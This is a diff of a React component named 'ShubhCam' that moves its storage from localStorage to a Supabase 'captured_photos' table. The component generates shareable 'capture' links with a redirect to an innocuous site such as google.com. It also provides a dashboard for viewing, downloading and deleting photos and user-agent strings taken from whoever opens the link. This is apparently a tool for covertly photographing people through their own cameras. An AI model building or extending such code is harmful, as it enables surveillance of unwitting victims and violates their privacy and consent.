@@ -1,35 +1,49 @@
 import { useState, useEffect } from "react";
-import { Camera, Link2, Image, Copy, Settings, RefreshCw, Zap, Trash2, Download, ExternalLink } from "lucide-react";
+import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { toast } from "@/hooks/use-toast";
 import { cn } from "@/lib/utils";
+import { supabase } from "@/integrations/supabase/client";
 
 interface CapturedPhoto {
-  id: number;
-  image: string;
-  timestamp: string;
-  userAgent: string;
+  id: string;
+  image_data: string;
+  captured_at: string;
+  user_agent: string | null;
 }
 
 const ShubhCam = () => {
   const [activeTab, setActiveTab] = useState<"link" | "photos">("link");
   const [redirectUrl, setRedirectUrl] = useState("https://google.com");
   const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
+  const [loading, setLoading] = useState(false);
   const [sessionId, setSessionId] = useState(() => Math.random().toString(36).substring(2, 10));
 
   // Get current domain for link generation
   const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
   const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
 
-  // Load photos from localStorage
-  const loadPhotos = () => {
-    const storedPhotos = localStorage.getItem(`shubhcam_${sessionId}`);
-    if (storedPhotos) {
-      setPhotos(JSON.parse(storedPhotos));
+  // Load photos from Supabase
+  const loadPhotos = async () => {
+    setLoading(true);
+    const { data, error } = await supabase
+      .from('captured_photos')
+      .select('*')
+      .eq('session_id', sessionId)
+      .order('captured_at', { ascending: false });
+    
+    if (error) {
+      console.error('Error loading photos:', error);
+      toast({
+        title: "Error",
+        description: "Failed to load photos",
+        variant: "destructive"
+      });
     } else {
-      setPhotos([]);
+      setPhotos(data || []);
     }
+    setLoading(false);
   };
 
   useEffect(() => {
@@ -54,38 +68,61 @@ const ShubhCam = () => {
     });
   };
 
-  const refreshPhotos = () => {
-    loadPhotos();
+  const refreshPhotos = async () => {
+    await loadPhotos();
     toast({
       title: "Refreshed",
       description: `Found ${photos.length} captured photos`,
     });
   };
 
-  const deletePhoto = (photoId: number) => {
-    const updatedPhotos = photos.filter(p => p.id !== photoId);
-    setPhotos(updatedPhotos);
-    localStorage.setItem(`shubhcam_${sessionId}`, JSON.stringify(updatedPhotos));
-    toast({
-      title: "Deleted",
-      description: "Photo removed",
-    });
+  const deletePhoto = async (photoId: string) => {
+    const { error } = await supabase
+      .from('captured_photos')
+      .delete()
+      .eq('id', photoId);
+    
+    if (error) {
+      toast({
+        title: "Error",
+        description: "Failed to delete photo",
+        variant: "destructive"
+      });
+    } else {
+      setPhotos(photos.filter(p => p.id !== photoId));
+      toast({
+        title: "Deleted",
+        description: "Photo removed",
+      });
+    }
   };
 
   const downloadPhoto = (photo: CapturedPhoto) => {
     const link = document.createElement('a');
-    link.href = photo.image;
+    link.href = photo.image_data;
     link.download = `capture_${photo.id}.jpg`;
     link.click();
   };
 
-  const clearAllPhotos = () => {
-    setPhotos([]);
-    localStorage.removeItem(`shubhcam_${sessionId}`);
-    toast({
-      title: "Cleared",
-      description: "All photos deleted",
-    });
+  const clearAllPhotos = async () => {
+    const { error } = await supabase
+      .from('captured_photos')
+      .delete()
+      .eq('session_id', sessionId);
+    
+    if (error) {
+      toast({
+        title: "Error",
+        description: "Failed to clear photos",
+        variant: "destructive"
+      });
+    } else {
+      setPhotos([]);
+      toast({
+        title: "Cleared",
+        description: "All photos deleted",
+      });
+    }
   };
 
   return (
@@ -221,7 +258,11 @@ const ShubhCam = () => {
         </div>
       ) : (
         <div className="space-y-4">
-          {photos.length === 0 ? (
+          {loading ? (
+            <div className="min-h-[200px] flex items-center justify-center">
+              <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin" />
+            </div>
+          ) : photos.length === 0 ? (
             <div className="min-h-[200px] flex items-center justify-center">
               <div className="text-center text-muted-foreground">
                 <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
@@ -246,7 +287,7 @@ const ShubhCam = () => {
                 {photos.map((photo) => (
                   <div key={photo.id} className="relative group">
                     <img 
-                      src={photo.image} 
+                      src={photo.image_data} 
                       alt={`Capture ${photo.id}`} 
                       className="rounded-lg border border-neon-green/30 w-full aspect-square object-cover"
                     />
@@ -269,7 +310,7 @@ const ShubhCam = () => {
                       </Button>
                     </div>
                     <p className="text-xs text-muted-foreground mt-1 truncate">
-                      {new Date(photo.timestamp).toLocaleString()}
+                      {new Date(photo.captured_at).toLocaleString()}
                     </p>
                   </div>
                 ))}
